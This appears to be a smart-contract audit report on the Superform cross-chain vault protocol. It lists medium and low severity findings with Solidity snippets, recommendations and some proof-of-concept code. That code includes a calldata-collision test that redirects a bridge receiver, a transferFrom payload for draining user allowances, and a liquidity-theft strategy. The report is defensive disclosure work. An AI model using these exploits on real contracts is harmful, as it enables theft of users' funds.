https://github.com/lifinance/contracts/blob/44bae5072fac2594f38c767b7e36a6b12fbd5c27/src/Facets/CalldataVerificationFacet.sol#L210-L302

To see how additional parameters should be checked when calling these underlying bridges



### emergencyWithdraw enables users to withdraw outside the allowed `block.timestamp` when using Timelock

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**: when `Forms` are paused, a user that wants to withdraw, this withdraw will end up in the `withdrawQueue`, as per [docs](https://docs.superform.xyz/periphery-contracts/emergencyqueue#core-concepts).

This can be gamed by people who are using `ERC46262TimelockForm.sol` - there is nothing that checks if the `TimelockForm` is eligible for withdraw:
```javascript
    function xChainDepositIntoVault(
        InitSingleVaultData memory singleVaultData_,
        address srcSender_,
        uint64 srcChainId_
    )
        external
        override
        onlyCoreStateRegistry
        notPaused(singleVaultData_)
        returns (uint256 dstAmount)
    {
        dstAmount = _xChainDepositIntoVault(singleVaultData_, srcSender_, srcChainId_);
    }
```

Since the `withdrawQueue` will always be emptied, users that are `Timelocked` can just mass-withdraw during the phase that a form is `Paused`, even if they are not eligible for a withdraw.

**Recommendation**: add a check in `ERC4626TimelockForm._emergencyWithdraw` to ensure that the withdraws are eligible to be withdrawn.



### DstSwapper::processTx An attacker can use multiple destination swaps back and forth to inflate xChain deposit

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Summary
A malicious user can use multiple back and forth swaps to inflate the amount of deposit

- Vulnerability Detail
The operator calling `DstSwapper` can process swaps in batch for a given payloadId. If the payload contains multiple swaps between tokenA and tokenB for amount X, the liquidity the sender needs to provide initially is only X tokenA. 

However as all swaps are finished, there are N successful swaps each for X in token A and token B. This means that if otherwise the liquidity is available in `DstSwapper`, the sender can take it.

This is due to the fact that `DstSwapper` only checks the target token increase during a swap, but does not register its decrease when used in another swap for the same `payloadId`. 

```solidity
    function _processTx(
        uint256 payloadId_,
        uint256 index_,
        uint8 bridgeId_,
        bytes calldata txData_,
        address userSuppliedInterimToken_,
        IBaseStateRegistry coreStateRegistry_
    )
        internal
    {
        // Unrelated validation logic
        ...

        /// @dev get the address of the bridge to send the txData to.
        (v.underlying, v.expectedAmount, v.maxSlippage) = _getFormUnderlyingFrom(coreStateRegistry_, payloadId_, index_);

>>>     v.balanceBefore = IERC20(v.underlying).balanceOf(v.finalDst);

        //Swap tokens in bridge
        ...

>>>     v.balanceAfter = IERC20(v.underlying).balanceOf(v.finalDst);

        if (v.balanceAfter <= v.balanceBefore) {
            revert Error.INVALID_SWAP_OUTPUT();
        }

>>>     v.balanceDiff = v.balanceAfter - v.balanceBefore;

        /// @dev if actual underlying is less than expAmount adjusted
        /// with maxSlippage, invariant breaks
        /// @notice that unlike in CoreStateRegistry slippage check inside updateDeposit, in here we don't check for
        /// negative slippage
        /// @notice this essentially allows any amount to be swapped, (the invariant will still break if the amount is
        /// too low)
        /// @notice this doesn't mean that the keeper or the user can swap any amount, because of the 2nd slippage check
        /// in CoreStateRegistry
        /// @notice in this check, we check if there is negative slippage, for which case, the user is capped to receive
        /// the v.expAmount of tokens (originally defined)
        if (v.balanceDiff < ((v.expectedAmount * (10_000 - v.maxSlippage)) / 10_000)) {
            revert Error.SLIPPAGE_OUT_OF_BOUNDS();
        }

        /// @dev updates swapped amount
>>>     swappedAmount[payloadId_][index_] = v.balanceDiff;

        /// @dev emits final event
        emit SwapProcessed(payloadId_, index_, bridgeId_, v.balanceDiff);
    }
```

This strategy is conditioned on the fact that the malicious user Alice can get the operator to carry the swaps on the destination chain even though the liquidity of Alice has not been bridged correctly on destination chain.

As such this vulnerability is dependent on how off-chain infrastructure handles failed token bridging, but here are some strategies to get the bridging of tokens to fail intentionally:

- Supply unmatched deposit tokens/interim tokens for xChain deposit
- Use #177 or #186 and bridge tokens to a receiver address controlled by the attacker
- Use gas parameter manipulation to make the call fail on destination chain

- Impact
A malicious user can steal liquidity contained in DstSwapper which, depending on off-chain infra can be provided by other users.

- Code Snippet

- Tool used
Manual Review

- Recommendation
Two solution may be envisionned:
- Register pulled balances of tokens during swaps
- Impose that a target token in a swap cannot be a source token in another swap for the same `payloadId`



### A malicious user can craft valid calldata to call 'packed' version of some of LiFi endpoints

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Summary
Some endpoints of the LiFi bridge do not conform to the shape (ILiFi.BridgeData, ...). In that case it is possible to craft a calldata which decodes to the tuple (ILiFi.BridgeData, ...), but is also a valid input to the endpoint. In that case validateTxData does not validate the right data, and the malicious user ends up bridging liquidity to himself.

- Vulnerability Detail

Some endpoints on the LiFi diamond enable `packing` of calldata:

HopFacetPacked:

    - startBridgeTokensViaHopL2NativePacked

    - startBridgeTokensViaHopL2NativeMin

https://etherscan.deth.net/address/0x6ef81a18e1e432c289dc0d1a670b78e8bbf9aa35

CBridgeFacetPacked:

    - startBridgeTokensViaCBridgeNativePacked
    
    - startBridgeTokensViaCBridgeNativeMin
    
    - startBridgeTokensViaCBridgeERC20Packed
    
    - startBridgeTokensViaCBridgeERC20Min

https://etherscan.deth.net/address/0xe7bf43c55551b1036e796e7fd3b125d1f9903e2e


Let's take the example of `CBridgeFacetPacked::startBridgeTokensViaCBridgeERC20Packed`:

```solidity
function startBridgeTokensViaCBridgeERC20Min(
    bytes32 transactionId,
    address receiver,
    uint64 destinationChainId,
    address sendingAssetId,
    uint256 amount,
    uint64 nonce,
    uint32 maxSlippage
) external;
```

We see that it expects a calldata of the shape: `(bytes32, address, uint64, address, uint256, uint64, uint32)`, which is static (no dynamic length types)
On the other hand, `ILiFi.BridgeData` is a dynamic struct, which means that the first 32 bytes word holds the offset at which the struct is located.

In the case of the calldata for the packed endpoint, the first 32 bytes word is `bytes32 transactionId`, which is an arbitrary blob used for tracking/analytics. So we can easily craft a calldata which decodes validly for both cases:

POC:

```solidity
struct BridgeData {
    bytes32 transactionId;
    string bridge;
    string integrator;
    address referrer;
    address sendingAssetId;
    address receiver;
    uint256 minAmount;
    uint256 destinationChainId;
    bool hasSourceSwaps;
    bool hasDestinationCall;
}

function testEncodeCollision() public {
    //This variable acts as the transactionId during the actual call,
    //But also works as the offset for the encoding of the dynamic struct
    bytes32 transactionId = bytes32(uint(0x100));

    //Completely different receiver
    address receiver = address(1337);

    uint64 destinationChainId = 1;
    address sendingAssetId = address(3);
    uint256 amount = 1000;
    uint64 nonce = 1001;
    uint32 maxSlippage = 1002;

    bytes memory _calldata = abi.encode(
        transactionId,
        receiver,
        destinationChainId,
        sendingAssetId,
        amount,
        nonce,
        maxSlippage
    );

    BridgeData memory bridgeData = BridgeData(
        bytes32(uint(1)),
        'stargate',
        'jumper.exchange',
        address(1),
        address(2),

        //This is the receiver checked by `validateTxData`
        address(3),
        4,
        1,
        false,
        false
    );

    bytes memory bridgeDataEncoded = abi.encode(bridgeData);

    // We concat both encodings        
    _calldata = abi.encodePacked(_calldata, bridgeDataEncoded);


    // First we can decode the format needed for the endpoint 
    (, address actualReceiver, , , , ,) = abi.decode(_calldata, (
        bytes32,
        address,
        uint64,
        address,
        uint256,
        uint64,
        uint32
    ));

    // But we can also decode the format needed for validateTx 
    BridgeData memory bridgeDataDecoded = abi.decode(_calldata, (
        BridgeData
    ));

    assert(bridgeDataDecoded.receiver == bridgeData.receiver);
    assert(actualReceiver == address(1337));

    console.logBytes(_calldata);
}
```

- Impact
A malicious user can use this to bypass validateTx checks, and send tokens to himself on destination chain. Depending on the mechanism implemented off-chain, it can be tricked into using liquidity already available in DstSwapper, since the bridging succeeds.

- Code Snippet

- Tool used

Manual Review

- Recommendation
Two solutions are possible:

Either blacklist the `packed` endpoints

Force the calldata to have the BridgeData at the start (offset 0x20), making this collision impossible in practice



### LifiValidator::validateTxData calldata can decode to BridgeData type but also be compatible with generic swap

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Summary

In `LiFiValidator::validateTxData` uses the assumption that if the calldata is valid for the generic swap function call, it will fail to decode during `extractMainParameters`. This is why the xChain case is handled in a `try` block, whereas local in `catch` block.

However it is possible to create a calldata which is validly decoded by `extractMainParameters`, and also valid when calling `swapTokensGeneric` on the LiFi diamond.

Furthermore, the sets of parameters that these encodings represent do not overlap, which means a malicious user can entirely bypass the validation logic, and use an arbitrary local swap when indicating a xChain deposit to superform

- Vulnerability Detail
The detailed mechanism making this possible is already detailed in #177

Please note that in this case `swapTokensGeneric` which has the signature:

```solidity
function swapTokensGeneric(
    bytes32 _transactionId,
    string calldata _integrator,
    string calldata _referrer,
    address payable _receiver,
    uint256 _minAmount,
    LibSwap.SwapData[] calldata _swapData
) external payable 
```

Which has the same arbitrary blob `_transactionId` which we can use to specify an offset for the location of the dynamic type `BridgeData`.

- Impact
A malicious user can use this to bypass the validateTx chain entirely, and execute a local swap when indicating a xChain deposit to superform. 

- Code Snippet

- Tool used

Manual Review

- Recommendation
Match on the selector called, instead of relying on encoding matching (which can be collision prone)



### malicious-admin-combing-with-low-level-call-can-steal-fund-from-user-or-form

**Severity:** Medium risk

**Context:** [LiquidityHandler.sol#L54-L54](superform-core/src/crosschain-liquidity/LiquidityHandler.sol#L54-L54)

- M-malicious-admin-combing-with-low-level-call-can-steal-fund-from-user-or-form

[Line of code](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/crosschain-liquidity/LiquidityHandler.sol#L33)

```solidity
function _dispatchTokens(
        address bridge_,
        bytes memory txData_,
        address token_,
        uint256 amount_,
        uint256 nativeAmount_
    )
        internal
        virtual
    {
        if (bridge_ == address(0)) {
            revert Error.ZERO_ADDRESS();
        }

        if (token_ != NATIVE) {
            IERC20 token = IERC20(token_);
            token.safeIncreaseAllowance(bridge_, amount_);
        } else {
            if (nativeAmount_ < amount_) revert Error.INSUFFICIENT_NATIVE_AMOUNT();
        }

        (bool success,) = payable(bridge_).call{ value: nativeAmount_ }(txData_);
        if (!success) revert Error.FAILED_TO_EXECUTE_TXDATA(token_);
    }
```
The intended function of this function is to enable users to bridge tokens or conduct token swaps through the 1inch exchange, utilizing low-level calls.

```solidity
(bool success,) = payable(bridge_).call{ value: nativeAmount_ }(txData_);
```

**What is address bridge?**

Address bridge is expected to be either Lifi address or 1inch address.

this function is usually called in this way:
[Line of code](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L516)

```solidity
/// @dev dispatches tokens through the selected liquidity bridge to the destination contract
_dispatchTokens(
	superRegistry.getBridgeAddress(args_.liqRequest.bridgeId),
	args_.liqRequest.txData,
	args_.liqRequest.token,
	IBridgeValidator(bridgeValidator).decodeAmountIn(args_.liqRequest.txData, true),
	args_.liqRequest.nativeAmount
);
```
However, malicious admin can whitelist a malicious address so the query

```solidity
superRegistry.getBridgeAddress(args_.liqRequest.bridgeId)
```

can return a token address

consider the case:

1. user give infinite spending allowance for router for UDSC token
2. admin is comproised and hacker whitelist the USDC token address for bridge id 1000

so
```solidity
superRegistry.getBridgeAddress(args_.liqRequest.bridgeId)
```

return USDC address

3. hacker craft the payload data
```solidity
abi.encodeWithSelector(IERC20.transferFrom.selector, address(victim), address(hacker), userUSDCBalance)
```
4. then hacker can steal the USDC that sit in user's wallet by using the low level call

```solidity
(bool success,) = payable(bridge_).call{ value: nativeAmount_ }(txData_);
```

- Recommendation
Do not use low level call, use explicit call with interface function,

and avoid let admin whitelist token address



### Users can deposit in superforms created from paused form implementations

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- Users interacting with the protocol either by depositing in superforforms or withdrawing from it, on the same chain or across chains, and these interactions are done in the `SuperformRouter` that represents users interacting contract.

- In cases of emergencies where the superform implementation is paused; users can't directly withdraw from these superform vaults; they place their withdrawal request and this will be processed later by the `EmergencyQueue` emergency admin.

- These implementations (where superform vaults are created/cloned from) can be paused by the `SuperformFactory` emergency admin in cases of emergencies (such as the implementation has a security risk that might result in users funds loss and vault drainage/or if the implementation is corrupted) via `changeFormImplementationPauseStatus` function.

- But it was noticed that users can deposit in any superform regardless if its implementation being paused or not; which will result in depositing in corrupted/compromised superforms and exposing users deposited assets to being compromised.

- Lines of Code

- an example where depositing is done without checking if the superform implementation is paused:

[BaseRouterImplementation.\_directSingleDeposit function](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseRouterImplementation.sol#L593C5-L631C1)

```solidity
    function _directSingleDeposit(
        address srcSender_,
        bytes memory permit2data_,
        InitSingleVaultData memory vaultData_
    )
        internal
        virtual
    {
        address superform;
        uint256 dstAmount;

        /// @dev decode superforms
        (superform,,) = vaultData_.superformId.getSuperform();

        _singleVaultTokenForward(srcSender_, superform, permit2data_, vaultData_);

        /// @dev deposits token to a given vault and mint vault positions.
        dstAmount = _directDeposit(
            superform,
            vaultData_.payloadId,
            vaultData_.superformId,
            vaultData_.amount,
            vaultData_.maxSlippage,
            vaultData_.retain4626,
            vaultData_.liqData,
            vaultData_.receiverAddress,
            vaultData_.extraFormData,
            vaultData_.liqData.nativeAmount,
            srcSender_
        );

        if (dstAmount != 0 && !vaultData_.retain4626) {
            /// @dev mint super positions at the end of the deposit action if user doesn't retain 4626
            ISuperPositions(superRegistry.getAddress(keccak256("SUPER_POSITIONS"))).mintSingle(
                srcSender_, vaultData_.superformId, dstAmount
            );
        }
    }
```

- withdrawing from superforms checks if the superform implementation is paused (SuperformRouter.singleDirectSingleVaultDeposit function redirects to this):

[BaseForm.directWithdrawFromVault function](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/BaseForm.sol#L187C4-L203C6)

```solidity
 function directWithdrawFromVault(
        InitSingleVaultData memory singleVaultData_,
        address srcSender_
    )
        external
        override
        onlySuperRouter
        returns (uint256 dstAmount)
    {
        if (!_isPaused(singleVaultData_.superformId)) {
            dstAmount = _directWithdrawFromVault(singleVaultData_, srcSender_);
        } else {
            IEmergencyQueue(superRegistry.getAddress(keccak256("EMERGENCY_QUEUE"))).queueWithdrawal(
                singleVaultData_, srcSender_
            );
        }
    }
```

- Recommendation

Prevent depositing in superforms if their implementations are paused.



### When retain4626 is false, the superposition may be minted to an incorrect address.

**Severity:** Medium risk

**Context:** [BaseRouterImplementation.sol#L593-L630](superform-core/src/BaseRouterImplementation.sol#L593-L630)

**Description**:  
When depositing to the vault, users can make deposits on behalf of other users by specifying the receiving address. If the user doesn't retain 4626, the function will mint super positions at the end of the deposit action.

```solidity
if (dstAmount != 0 && !vaultData_.retain4626) {
            /// @dev mint super positions at the end of the deposit action if user doesn't retain 4626
            ISuperPositions(superRegistry.getAddress(keccak256("SUPER_POSITIONS"))).mintSingle(
                srcSender_, vaultData_.superformId, dstAmount
            ); 
        }
```
The issue occurs when the user wants to deposit to another address but doesn't want to keep 4626, resulting in the super position being minted for the msg.sender instead of the receiver address.

**Recommendation**: 
Mint superposition for the receiver's address when the function caller wants to deposit to a different address and does not want to keep 4626.



### Vault shares can be wrong after the emergency withdraw

**Severity:** Medium risk

**Context:** [ERC4626FormImplementation.sol#L401-L410](superform-core/src/forms/ERC4626FormImplementation.sol#L401-L410)

**Description**:
```solidity
if (!_isPaused(singleVaultData_.superformId)) {
            dstAmount = _directWithdrawFromVault(singleVaultData_, srcSender_);
        } else {
            IEmergencyQueue(superRegistry.getAddress(keccak256("EMERGENCY_QUEUE"))).queueWithdrawal(
                singleVaultData_, srcSender_
            );
        }
```
When a vault is paused, user withdrawals are queued for later execution by the emergency admin. The funds will then be transferred to the refundAddress from the vault.

```solidity
function _processEmergencyWithdraw(address refundAddress_, uint256 amount_) internal {
        IERC4626 vaultContract = IERC4626(vault);

        if (vaultContract.balanceOf(address(this)) < amount_) {
            revert Error.INSUFFICIENT_BALANCE();
        }

        vaultContract.safeTransfer(refundAddress_, amount_);
        emit EmergencyWithdrawalProcessed(refundAddress_, amount_);
    }
```
The issue is that when funds are transferred from the vault, it directly transfers the funds without updating the vault shares. This can result in incorrect share calculations the next time the vault is used, such as when depositing to the vault. As a result, the wrong amount of vault shares may be minted.

**Recommendation**:
Update vault shares when an emergency withdrawal occurs.



### Vaults for assets that can rebase negatively are prone to unexpectedly revert

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Summary

Superform is designed to allow any external protocol to integrate their yield-generating Vault into the system by wrapping it within a `Form` contract. As of the current audit, only `ERC4626` Vaults are supported.

Superform enables teams to integrate their Vault into the system and leverage its integrations with cross-chain bridging solutions, providing users on any supported chain access to the external team's product.

In this report, I demonstrate how the cross-chain withdrawal process can be subject to unexpected reverting transactions on the withdrawal's destination chain, especially when a Vault employs an asset that may negatively rebase, similar to how [Pods Finance's stETHvv Vault](https://docs.pods.finance/stethvv/what-is-stethvv) functions in the case of Lido suffering a slashing event.

- Vulnerability Detail

The issue I've identified lies in the strictness of the check employed within the `ERC4626FormImplementation#_processXChainWithdraw()` method.

This function calls `dstAmount = vault.redeem()` to withdraw the user's funds, and in the case where `singleVaultData_.liqData.txData.length != 0`, it compares `dstAmount` with the withdraw payload's txData's stored `amount`, a value written during the payload's update process.

If the Vault's asset suffers a negative rebase between the payload's update and its processing, which I assume to occur as two separate transactions, the amount of asset represented by the user's shares may reduce below the expected `amount`, causing the check at [ERC4626FormImplementation.sol#L367](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L367) to unexpectedly revert.

- Impact

Unexpected reverting transactions during the cross-chain withdrawal process.

- PoC

1. Assume Alice currently has a cross-chain deposit, done via Superform, into a Vault as described in the [Summary](#summary) section.
2. Alice initiates a cross-chain withdrawal, utilizing all her shares.
3. The cross-chain withdrawal payload is correctly processed by the AMBs, and a quorum of proofs reaches the Superform system on the destination chain.
4. The `UPDATER` keeper updates the payload via `CoreStateRegistry`, inserting a `txData` whose `amount` field is `X`.
5. The Vault's collateral asset suffers a `1%` negative rebase: all holders now hold `1%` less asset, which translates into its shares now being worth `99%` of how much they were worth before the rebase, in asset terms.
6. The `PROCESSOR` keeper will process the payload:
    - The transaction's flow reaches `ERC4626FormImplementation#_processXChainWithdraw()`, which redeems the Vault's shares.
    - The Vault returns `99%` of the expected amount of asset because of the negative rebase.
    - As a consequence of the above, the transaction will revert, as `vars.amount > dstAmount`, i.e., the amount expected to be received is, in fact, greater than the amount of asset sent by the Vault.

- Tools used

Manual review

- Recommendation

Consider adding the possibility for users to specify a tolerable slippage amount (or percentage) for their withdrawals: the current functionality can be maintained by setting such a parameter to `0`, while for a case such as the one presented, a non-`0` value may be recommended to the user.

As such, the amount of asset obtained from the Vault during the redeem process must be allowed to be above or equal to the expected amount, reduced by the user's tolerable slippage amount.




###  Superform protocol doesn't support vaults if their underlying asset is of fee-on-transfer token type

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- The protocol allows any vault owner from adding their vaults to the protocol by wrapping it to one of the approved form Implementations.

- These vaults can have any type of underlying assets including fee-on-transfer token type; which deducts a fee from the transferred amount, so the resulting final balance of the receiver would be less than the sent amount by the amount of the deducted fees.

- It was noticed that the protocol doesn't support such type of tokens; users can't deposit in vaults with f.o.t tokens due to this check made in the [`ERC4626FormImplementation._processDirectDeposit` function](https://github.com/superform-xyz/superform-core/blob/29aa0519f4e65aa2f8477b76fc9cc924a6bdec8b/src/forms/ERC4626FormImplementation.sol#L227C1-L233C10)

  ```javascript
          vars.assetDifference = IERC20(vars.asset).balanceOf(address(this)) - vars.balanceBefore;

        /// @dev the difference in vault tokens, ready to be deposited, is compared with the amount inscribed in the
        /// superform data
        if (vars.assetDifference < singleVaultData_.amount) {
            revert Error.DIRECT_DEPOSIT_INVALID_DATA();
        }
  ```

  where `vars.assetDifference` will always be less than `singleVaultData_.amount` due to the deducted fees (for f.o.t underlying vault token).

- Recommendation

Update the function to support fee-on-transfer tokens.



### Increasing quorum requirements will prevent messages from being processed

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

The admin can call `setRequiredMessagingQuorum` to set `requiredQuorum`.
```solidity
    function setRequiredMessagingQuorum(uint64 srcChainId_, uint256 quorum_) external override onlyProtocolAdmin {
        requiredQuorum[srcChainId_] = quorum_;

        emit QuorumSet(srcChainId_, quorum_);
    }
```
And the message can only be processed if the number of proof messages received is greater than the requiredQuorum.
```solidity
        if (messageQuorum[payloadProof] < _getQuorum(srcChainId)) {
            revert Error.INSUFFICIENT_QUORUM();
        }
```

The problem here is that when a cross-chain message is initiated, the length of its `ambIds` is fixed, i.e. the number of messages sent is fixed, which also means that the number of received proof messages, i.e. `messageQuorum`, will not exceed it.

If `setRequiredMessagingQuorum` is called to increase the `requiredQuorum` between the initiation and processing of a cross-chain message, then when the cross-chain message is processed, it will not be processed due to insufficient `messageQuorum`.

1.Consider chain A with requiredQuorum 3, a user initiates a cross-chain deposit with ambIds length 4. 

2.When the message is successfully dispatched, admin calls setRequiredMessagingQuorum to increase the requiredQuorum to 5.

3.When the destination chain processes the message, the message will not be processed because the messageQuorum is at most 4 and less than 5.


**Recommendation**:

Consider caching the current quorum requirements in the payload when a cross-chain message is initiated, and using it instead of the latest quorum requirements for the checks



### Lack of User Control Over Share Allocation in Vault Deposits May Lead to Unpredictable Outcomes

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- details :

- The protocol lacks validation to ensure that the number of shares minted by a vault upon deposit aligns with the user's expectations, and the user have no choice only to accept any amount of shares resulted when depositing to a vault. This is particularly concerning for vaults that implement additional deposit strategies, which could be susceptible to front-running or other market manipulations.

- For example, a vault might use the deposited assets to engage in yield farming activities, where the number of **shares** minted to the depositor is dependent on the current state of the external protocol. If this protocol's conditions change rapidly, such as through front-running,The current protocol design expose the user to front running attacks..
- example from the `_processDirectDeposit` function of a superForm:

```js
 function _processDirectDeposit(InitSingleVaultData memory singleVaultData_) internal returns (uint256 dstAmount) {
        // prev code ....
        if (singleVaultData_.retain4626) {
            //@audit : user can't refuse the amount of shares minted even if it's zero .
   >>       dstAmount = v.deposit(vars.assetDifference, singleVaultData_.receiverAddress);
        } else {
   >>         dstAmount = v.deposit(vars.assetDifference, address(this));
        }
    }
```

```js
function _directSingleDeposit( address srcSender_, bytes memory permit2data_,InitSingleVaultData memory vaultData_)
     internal virtual {
    //    prev code ...
        // @audit : the contract mint any amount resulted from depositing , and the user have no control of that
    >>    if (dstAmount != 0 && !vaultData_.retain4626) {
            /// @dev mint super positions at the end of the deposit action if user doesn't retain 4626
            ISuperPositions(superRegistry.getAddress(keccak256("SUPER_POSITIONS"))).mintSingle(
                srcSender_, vaultData_.superformId, dstAmount
            );
        }
    }
```

- impact :

- This could lead to users receiving fewer shares than anticipated if the vault's share price is affected by other on-chain activities.

- Recommendation :

- To mitigate this risk, the user should have the ability to specify his desired `mintedAmount` of shares when he depositing to a `superForm` .



## Low risk
### Amounts passed as argument can be ignored

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_


**Description**:

The `setApprovalForMany(address spender, uint256[] memory ids, uint256[] memory amounts)` function doesn't check that the length of `ids` is the same as the length of `amounts`.

This can lead to some amounts elements being ignored.

The same applies to `increaseAllowanceForMany()` and `decreaseAllowanceForMany()` functions.

*Note: `transmuteBatchToERC20()` and `transmuteBatchToERC1155A()` functions are not in scope as they call `_batchMint()` or `_batchBurn()` which verify the arrays length.*

Impacted scope is:
- https://github.com/superform-xyz/ERC1155A/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L207-L213
- https://github.com/superform-xyz/ERC1155A/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L216-L233
- https://github.com/superform-xyz/ERC1155A/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L236-L252

**Proof of Concept**:
The 2 following Foundry tests shows the behaviour of the `setApprovalForMany` when length of arrays mismatch.

```solidity
    function testSetApprovalForManyIdsSizeGreaterThanAmountsSize() public {
        uint256[] memory ids = new uint256[](5);
        ids[0] = 1337;
        ids[1] = 1338;
        ids[2] = 1339;
        ids[3] = 1340;
        ids[4] = 1341;

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 50;
        amounts[1] = 100;
        amounts[2] = 150;

        hevm.prank(address(0xBEEF));
        (bool success, ) = address(token).call(abi.encodeWithSignature("setApprovalForMany(address,uint256[] calldata,uint256[] calldata", address(this), ids, amounts));
        assert(!success); // Fails when ids.length > amounts.length
    }

    function testSetApprovalForManyIdsSizeLowerThanAmountsSize() public {
        uint256[] memory ids = new uint256[](3);
        ids[0] = 1337;
        ids[1] = 1338;
        ids[2] = 1339;

        uint256[] memory amounts = new uint256[](5);
        amounts[0] = 50;
        amounts[1] = 100;
        amounts[2] = 150;
        amounts[3] = 200;
        amounts[4] = 250;

        hevm.prank(address(0xBEEF));
        token.setApprovalForMany(address(this), ids, amounts);// Success when ids.length < amounts.length
    }
```

**Recommendation**:

Implement a `require` statement in the `setApprovalForMany()`,`increaseAllowanceForMany()` and `decreaseAllowanceForMany()` functions.

The following shows a fix example of the `setApprovalForMany()` function.

```solidity
    function setApprovalForMany(address spender, uint256[] memory ids, uint256[] memory amounts) public virtual {
        require(ids.length == amounts.length, "Array size mismatch");
        address owner = msg.sender;

        for (uint256 i; i < ids.length; ++i) {
            _setApprovalForOne(owner, spender, ids[i], amounts[i]);
        }
    }
```



### Floating Pragma Vulnerability in Superform Smart Contract Codebase

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_


- Severity
LOW

- Relevant GitHub Links
https://github.com/superform-xyz/ERC1155A/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/ERC1155A.sol#L2

https://github.com/superform-xyz/ERC1155A/blob/e7d53f306989ba205c779973d1b5e86755a1b9c0/src/aERC20.sol#L2

- Summary
The Superform smart contract repository utilizes a floating pragma in several files, exposing the project to potential security risks. This deviation from the best practice of using a locked pragma version could lead to undiscovered vulnerabilities, code inconsistency, and overall security issues.

- Vulnerability Details
The floating pragma vulnerability is observed in multiple files within the Superform smart contract codebase. Instead of specifying a locked pragma version, a range of compiler versions is allowed, creating uncertainty about the exact version used for deployment. This practice deviates from recommended security standards and could pose a significant risk to the project.

- Impact
The impact of the floating pragma vulnerability includes the following potential risks:
- Using a very recent compiler version may expose the code to undiscovered vulnerabilities.

- Tools Used
- Manual review

- Recommendations
**Use a Strict and Locked Pragma Version:**
   - Update all Solidity files in the Superform smart contract codebase to use a strict and locked pragma version. This helps ensure consistency and avoids potential vulnerabilities associated with floating pragma.

**Prefer a Stable Compiler Version:**
   - Choose a compiler version that is neither too old nor too recent, striking a balance between stability and security. This minimizes the risk of using a version with unresolved bugs or undiscovered vulnerabilities.


By implementing these recommendations, the Superform project can enhance the security of its smart contract codebase, mitigate potential vulnerabilities, and foster a more robust and reliable blockchain application.



### zero address checks in the constructor

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

 constructor(address superRegistry_) {
        if (block.chainid > type(uint64).max) {
            revert Error.BLOCK_CHAIN_ID_OUT_OF_BOUNDS();
        }

        CHAIN_ID = uint64(block.chainid);
        superRegistry = ISuperRegistry(superRegistry_);

        _disableInitializers();
    }

the constructor doesnt check to remove zero address



### Integrators lose value or get DoS-ed when estimating msg.value through PaymentHelper

**Severity:** Low risk

**Context:** [PaymentHelper.sol#L306-L306](superform-core/src/payments/PaymentHelper.sol#L306-L306)

- Impact
3rd part integrators using the `PaymentHelper` functions to estimate `msg.value` for invoking the `SuperformRouter` contract functions will always end up either overpaying the transaction or ending up with a failed transaction.

- Proof of Concept
The `PaymentHelper` contract allows users and other integrators to query the costs of executing functions on the `SuperformRouter` contract.
There are [6 convenience functions](https://docs.superform.xyz/periphery-contracts/paymenthelper#estimating-native-token-payments) that allow you to pass the same parameters as to the `SuperformRouter` contract functions and get the estimated gas costs.

The issue is that gas costs in these functions are computed using the prices provided by Chainlink. On the other hand, each `AMBImplementation` has its own prices.

If we look at LayerZero's [`RelayerV2`](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/RelayerV2.sol#L36) contract we can see that it has a mapping that stores the destination gas prices for each chainId.
These prices are different from what Chainlink provides, since they come from a different source and can be updated with a different frequency.

This is an issue because if you are let's say invoking `singleXChainSingleVaultDeposit` function you are supposed to provide `msg.value` to pay the LayerZero relayer to deliver the message to the destination chain.
If you have just used the `estimateSingleXChainSingleVault` function to figure out the `msg.value` and the Chainlink price is smaller than the price that the LayerZero relayer uses, you will end up with a failed transaction.

This is due to the fact that LayerZero estimates the needed `msg.value` based on the adapterParams(gasLimit), payload length, and some fixed costs by using its own dstPriceLookup entries.
- LayerZero `UltraLightNodeV2` `send` function fees: https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/UltraLightNodeV2.sol#L142-L144, https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/UltraLightNodeV2.sol#L169
- Fees are ultimately computed in the `RelayerV2` contract using the dstPriceLookup entry: https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/RelayerV2.sol#L101

This is effectively a DoS attack on the 3rd party integrators.

Another scenario is the integrator needing to send a much higher `msg.value` than needed since it cannot rely on the `PaymentHelper` contract view functions in which case he will be overpaying the transaction due to `_forwardPayment` logic.

As we have seen in practice gas prices can double or triple in a matter of minutes and this makes the `PaymentHelper` contract view functions not reliable for the integrators.

- Recommended Mitigation Steps

The `PaymentHelper` contract should be updated to use the prices from each AMBImplementation specific source.
In the case of LayerZero that would be the [RelayerV2 dstPriceLookup public function](https://github.com/LayerZero-Labs/LayerZero/blob/main/contracts/RelayerV2.sol#L36). 



### Users may lose ETH during deposit

**Severity:** Low risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

